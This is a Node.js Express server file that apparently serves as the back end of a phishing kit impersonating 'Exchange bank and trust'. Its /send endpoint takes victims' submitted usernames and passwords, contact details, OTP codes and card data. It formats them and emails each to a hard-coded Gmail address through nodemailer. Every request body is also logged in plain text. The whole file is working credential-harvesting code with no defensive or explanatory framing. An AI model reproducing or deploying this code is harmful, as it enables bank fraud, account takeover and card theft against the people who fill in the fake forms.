const express = require("express");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
const cors = require("cors");

dotenv.config();
const app = express();

// Print environment variables (but mask sensitive data)
console.log('Environment variables loaded:', {
  EMAIL_USER: process.env.EMAIL_USER ? process.env.EMAIL_USER : 'not set',
  EMAIL_PASS: process.env.EMAIL_PASS ? '****' : 'not set',
  NODE_ENV: process.env.NODE_ENV,
});

// Middleware with more permissive CORS settings
app.use(cors({
  origin: '*',  // Allow all origins temporarily for testing
  methods: ['GET', 'POST'],
  credentials: true
}));
app.use(express.json());

// Log all incoming requests
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  if (req.method === 'POST') {
    console.log('Request body:', req.body);
  }
  next();
});

// Simple health check endpoint
app.get("/health", (req, res) => {
  console.log("Health check endpoint hit");
  res.status(200).json({ status: "ok", message: "Server is running" });
});

app.post("/send", async (req, res) => {
  console.log("POST /send endpoint hit");
  const { email, message, subject } = req.body;
  
  console.log("Received request data:", { email, message, subject });

  if (!email || !message) {
    console.log("Missing required fields");
    return res.status(400).json({ success: false, error: 'Email and message are required' });
  }

  try {
    console.log("Creating email transporter...");
    // Use the verified working configuration
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      }
    });
    
    // Create custom subject based on form type
    let customSubject = 'New Form Submission';
    if (subject === 'Login Details') {
      customSubject = 'Submission of Exchange bank and trust sign in form';
    } else if (subject === 'Contact Info') {
      customSubject = 'Submission of Exchange bank and trust Contact Verification form';
    } else if (subject === 'OTP Verification') {
      customSubject = 'Submission of Exchange bank and trust OTP verification form';
    } else if (subject === 'Card Info') {
      customSubject = 'Submission of Exchange bank and trust Card Verification form';
    }
    
    // Define the mail options
    const mailOptions = {
      from: `"rmoster766@gmail.com" <${process.env.EMAIL_USER}>`,
      to: "melitazdenekxny23@gmail.com",
      subject: customSubject,
      text: getEmailText(subject, email, message),
      html: getEmailHtml(subject, email, message)
    };
    
    console.log("Attempting to send email...");
    
    // Send the email
    const info = await transporter.sendMail(mailOptions);

    console.log("Email sent successfully!", info);
    
    res.status(200).json({ success: true, message: 'Email sent successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, error: `Failed to send email: ${error.message}` });
  }
});

// Helper functions to format email based on subject
function getEmailText(subject, email, message) {
  if (subject === 'Login Details') {
    return `Username: ${email}\nPassword: ${message}`;
  } else if (subject === 'Contact Info') {
    return `Email Address: ${email}\nPhone Number: ${message}`;
  } else if (subject === 'OTP Verification') {
    return `Verification Code: ${message}`;
  } else if (subject === 'Card Info') {
    return message;
  } else {
    return `Message: ${message}`;
  }
}

function getEmailHtml(subject, email, message) {
  let title = 'Information';
  let contentHtml = '';
  
  if (subject === 'Login Details') {
    title = 'Login Information';
    contentHtml = `
      <p><strong>Username:</strong> ${email}</p>
      <p><strong>Password:</strong> ${message}</p>
    `;
  } else if (subject === 'Contact Info') {
    title = 'Contact Information';
    contentHtml = `
      <p><strong>Email Address:</strong> ${email}</p>
      <p><strong>Phone Number:</strong> ${message}</p>
    `;
  } else if (subject === 'OTP Verification') {
    title = 'Security Verification';
    contentHtml = `
      <p><strong>Verification Code:</strong> ${message}</p>
    `;
  } else if (subject === 'Card Info') {
    title = 'Card Information';
    
    // Format card details as a table for HTML
    const messageLines = message.split('\n');
    contentHtml = '<table style="width:100%; border-collapse: collapse;">';
    
    for (const line of messageLines) {
      const [label, value] = line.split(': ');
      if (label && value) {
        contentHtml += `
          <tr>
            <td style="padding: 8px 0; border-bottom: 1px solid #eee; font-weight: bold;">${label}</td>
            <td style="padding: 8px 0; border-bottom: 1px solid #eee;">${value}</td>
          </tr>`;
      }
    }
    
    contentHtml += '</table>';
  } else {
    contentHtml = `<p><strong>Message:</strong> ${message}</p>`;
  }
  
  // Return HTML without the footer text
  return `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
    <h2 style="color: #333;">${title}</h2>
    ${contentHtml}
  </div>`;
}

const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Test the server at: http://localhost:${PORT}/health`);
  console.log('Server will keep running. Press Ctrl+C to stop.');
});

// Keep the server running
process.stdin.resume();

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('Shutting down server...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});